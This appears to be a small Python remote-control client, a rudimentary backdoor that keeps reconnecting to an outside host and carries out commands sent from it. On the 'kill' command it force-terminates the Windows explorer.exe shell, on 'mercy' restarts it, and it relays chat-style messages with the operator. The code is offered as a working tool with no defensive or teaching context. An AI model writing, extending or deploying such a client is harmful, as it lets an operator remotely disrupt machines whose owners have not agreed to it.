#Imports
import socket
import time
import random
import os
import sys

#Variables
lhost = 'sashimi.port0.org'                    #Server IP
port = 6969                     #Connection Port

#Functions

def send(msg):
    s.send(msg.encode("UTF-8"))

def getInstructions():
    while True:
        msg = s.recv(4096)
        inst = msg.decode("UTF-8")

        #Instructions

        if inst == "test":
            try:
                send("[OK]Test works!")
            except:
                pass
        elif inst == "kill":
            os.system('taskkill -f -im explorer.exe')
            send("done")
        elif inst == "mercy":
            os.system('start explorer.exe')
            send("done")
        elif inst == "quit":
            print("shutting down in 3")
            send("done")
            time.sleep(1)
            print("2")
            time.sleep(1)
            print("1")
            time.sleep(1)
            exit()
        else:
            print(inst)
            msg = input("Message: ")
            send(msg)

#Connection

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
host = socket.gethostbyname(lhost)
print(host)
connected = False
while connected == False:
    try:
        s.connect((host, 1235))
        print('Socket Connected to ' + lhost + ' on ip ' + host)
        connected = True
    except:
        sleepTime = random.randint(1, 2)
        time.sleep(sleepTime)
        print("error, timed out, retrying")
getInstructions()
